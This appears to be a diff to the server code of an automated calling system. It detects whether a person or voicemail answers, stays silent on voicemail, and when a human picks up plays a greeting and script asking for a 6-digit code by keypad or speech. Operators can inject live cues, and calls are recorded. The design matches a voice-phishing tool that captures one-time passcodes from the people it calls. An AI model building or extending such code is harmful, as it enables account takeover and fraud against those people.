+    if (
+      session.answeredBy === 'voicemail' &&
+      checkHumanPickupOnVoicemail(session, speechParam, rawDigits)
+    ) {
+      session.humanPickedUpAfterVoicemail = true;
+      await applyAmdResult(session, 'human', 'plivo_human_after_voicemail');
+    } else {
+      session.silentPollCount = (session.silentPollCount || 0) + 1;
+      persistSessionsToDisk();
+      if (session.silentPollCount > 12) {
+        void finalizeCallRecording(session);
+        res.type('text/xml');
+        return res.send(`<?xml version="1.0" encoding="UTF-8"?><Response><Hangup /></Response>`);
+      }
+      res.type('text/xml');
+      return res.send(`<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+  <GetInput action="${escapeXml(gateUrl)}" method="POST" inputType="dtmf speech" numDigits="${session.numDigits || 6}" finishOnKey="#" executionTimeout="5" speechEndTimeout="auto">
+    <Wait length="5" />
+  </GetInput>
+  <Redirect method="POST">${escapeXml(gateUrl)}</Redirect>
+</Response>`);
+    }
+  }
+
+  const elapsedSinceAnswer = session.answeredAt
+    ? Date.now() - new Date(session.answeredAt).getTime()
+    : 4000;
+  const spokeLiveHuman =
+    typeof speechParam === 'string' &&
+    speechParam.trim().length > 0 &&
+    !isVoicemailGreetingSpeech(speechParam);
+
+  if (
+    session.answeredBy === 'human' ||
+    rawDigits.length > 0 ||
+    spokeLiveHuman ||
+    session.answeredBy === 'unknown' ||
+    elapsedSinceAnswer >= 3200
+  ) {
+    if (session.answeredBy !== 'human') {
+      await applyAmdResult(session, 'human', 'plivo_direct_human_pickup');
+    }
+    session.promptsStarted = true;
+    session.status = 'collecting-input';
+    addSessionEvent(session, {
+      type: 'playback',
+      title: 'Immediate Pickup Greeting Played',
+      description: `Playing synthetic voice to Live Human: "${session.introGreeting}"`,
+      data: { greeting: session.introGreeting },
+    });
+    const xml = `<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+  <Speak>${escapeXml(session.introGreeting)}</Speak>
+  <GetInput action="${escapeXml(gatherUrl)}" method="POST" inputType="dtmf speech" numDigits="${session.numDigits || 6}" finishOnKey="#" executionTimeout="25" digitEndTimeout="8" speechEndTimeout="auto">
+    <Speak>${escapeXml(session.script)}</Speak>
+  </GetInput>
+  <Speak>We did not receive your code. Thank you for your time. Goodbye.</Speak>
+  <Hangup />
+</Response>`;
+    res.type('text/xml');
+    return res.send(xml);
+  }
+
+  res.type('text/xml');
+  res.send(`<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+  <GetInput action="${escapeXml(gateUrl)}" method="POST" inputType="dtmf speech" numDigits="${session.numDigits || 6}" finishOnKey="#" executionTimeout="2" speechEndTimeout="auto">
+    <Wait length="2" />
+  </GetInput>
+  <Redirect method="POST">${escapeXml(gateUrl)}</Redirect>
+</Response>`);
 });
 
 // 2. Plivo Gather Callback (Strict post-code hold message rule + live speech capture)
@@ -2865,7 +3422,33 @@ app.post('/api/call/operator-action', async (req: Request, res: Response) => {
       break;
     }
 
+    case 'start_human_greeting': {
+      if (session.answeredBy === 'voicemail') {
+        session.humanPickedUpAfterVoicemail = true;
+      }
+      await applyAmdResult(session, 'human', 'operator_confirmed_human');
+
+      if (session.isSimulated) {
+        session.promptsStarted = true;
+        session.status = 'collecting-input';
+        addSessionEvent(session, {
+          type: 'playback',
+          title: 'Immediate Pickup Greeting Played',
+          description: `Operator confirmed live human. Playing synthetic voice: "${session.introGreeting}"`,
+          data: { greeting: session.introGreeting, voice: session.voice },
+        });
+      } else {
+        await redirectLiveCallToHumanStart(session, customTwilio, carriersConfig);
+      }
+      break;
+    }
+
     case 'custom_cue':
+      if (session.answeredBy === 'voicemail' && !session.humanPickedUpAfterVoicemail) {
+        return res.status(400).json({
+          error: 'Voicemail machine is on the line. Click "Human Picked Up — Play Greeting" first if a live person answered.',
+        });
+      }
       if (customMessage) {
         session.activeCue = { text: customMessage.trim(), timestamp: new Date().toISOString() };
         addSessionEvent(session, {
@@ -2934,6 +3517,8 @@ app.post('/api/call/simulate-event', async (req: Request, res: Response) => {
   switch (action) {
     case 'answer':
       session.status = 'in-progress';
+      session.answeredAt = new Date().toISOString();
+      session.promptsStarted = true;
       if (session.recordCall !== false) {
         session.recordingStatus = 'recording';
       }
@@ -2941,8 +3526,8 @@ app.post('/api/call/simulate-event', async (req: Request, res: Response) => {
 
       addSessionEvent(session, {
         type: 'call-state',
-        title: 'Recipient Answered Call (Human)',
-        description: `Call connected with ${session.to}. Playing immediate pickup greeting.`,
+        title: 'Direct Live Human Answered Call',
+        description: `Call connected with live human on ${session.to}. Listening, recording & playing immediate pickup greeting.`,
       });
 
       addSessionEvent(session, {
@@ -2962,19 +3547,50 @@ app.post('/api/call/simulate-event', async (req: Request, res: Response) => {
 
     case 'voicemail': {
       session.status = 'in-progress';
+      session.answeredAt = new Date().toISOString();
+      session.voicemailDetectedAt = session.answeredAt;
+      // CRITICAL: Never play greeting or prompts to a Voicemail Machine!
+      session.promptsStarted = false;
       if (session.recordCall !== false) {
         session.recordingStatus = 'recording';
       }
-      await applyAmdResult(session, 'voicemail', 'simulator_machine_end_beep');
+      await applyAmdResult(session, 'voicemail', 'simulator_machine_start');
       appendSpeechTranscript(
         session,
         `Your call has been forwarded to an automated voice messaging system for ${session.to}. At the tone, please record your message.`,
         0.98,
         'Voicemail Greeting'
       );
+      session.voicemailGreetingComplete = true;
       if (!session.autoHangupOnVoicemail) {
         session.status = 'collecting-input';
+        addSessionEvent(session, {
+          type: 'gather',
+          title: 'Silent Listening Active on Voicemail (Prompts Muted)',
+          description: 'Listening for voice/DTMF & recording from call start. Will play pickup greeting immediately if a human takes the phone.',
+        });
       }
+      break;
+    }
+
+    case 'human_pickup': {
+      session.humanPickedUpAfterVoicemail = true;
+      session.promptsStarted = true;
+      session.status = 'collecting-input';
+      await applyAmdResult(session, 'human', 'simulator_human_picked_up_after_voicemail');
+
+      addSessionEvent(session, {
+        type: 'playback',
+        title: 'Immediate Pickup Greeting Played',
+        description: `Human took the phone after voicemail! Playing immediate pickup greeting: "${session.introGreeting}"`,
+        data: { greeting: session.introGreeting, voice: session.voice },
+      });
+
+      addSessionEvent(session, {
+        type: 'gather',
+        title: `Listening for ${session.numDigits}-Digit Code & Live Voice`,
+        description: `Prompting live human: "${session.script}"`,
+      });
       break;
     }
 
@@ -2985,6 +3601,31 @@ app.post('/api/call/simulate-event', async (req: Request, res: Response) => {
           speech.trim(),
           typeof confidence === 'number' ? confidence : 0.95
         );
+
+        // If voicemail answered earlier and a human now speaks on the line (e.g. "Hello?"), start greeting immediately!
+        if (
+          session.answeredBy === 'voicemail' &&
+          !session.promptsStarted &&
+          checkHumanPickupOnVoicemail(session, speech.trim())
+        ) {
+          session.humanPickedUpAfterVoicemail = true;
+          session.promptsStarted = true;
+          session.status = 'collecting-input';
+          await applyAmdResult(session, 'human', 'human_voice_after_voicemail');
+
+          addSessionEvent(session, {
+            type: 'playback',
+            title: 'Immediate Pickup Greeting Played',
+            description: `Live human voice detected after voicemail! Playing greeting: "${session.introGreeting}"`,
+            data: { greeting: session.introGreeting, voice: session.voice },
+          });
+
+          return res.json({
+            success: true,
+            session,
+            humanPickedUp: true,
+          });
+        }
       }
       break;
 
@@ -2992,6 +3633,28 @@ app.post('/api/call/simulate-event', async (req: Request, res: Response) => {
       if (digits) {
         const expectedLen = session.numDigits || 6;
         const rawDigits = String(digits).replace(/\D/g, '');
+
+        // If voicemail was active and a human pressed a digit on the handset, wake up human greeting!
+        if (session.answeredBy === 'voicemail' && !session.promptsStarted) {
+          session.humanPickedUpAfterVoicemail = true;
+          session.promptsStarted = true;
+          session.status = 'collecting-input';
+          await applyAmdResult(session, 'human', 'human_keypad_after_voicemail');
+
+          if (rawDigits.length < expectedLen) {
+            addSessionEvent(session, {
+              type: 'playback',
+              title: 'Immediate Pickup Greeting Played',
+              description: `Keypad wakeup after voicemail! Playing greeting: "${session.introGreeting}"`,
+            });
+            return res.json({
+              success: true,
+              session,
+              humanPickedUp: true,
+              codeStatus: 'wakeup',
+            });
+          }
+        }
 
         if (rawDigits.length < expectedLen) {
           addSessionEvent(session, {
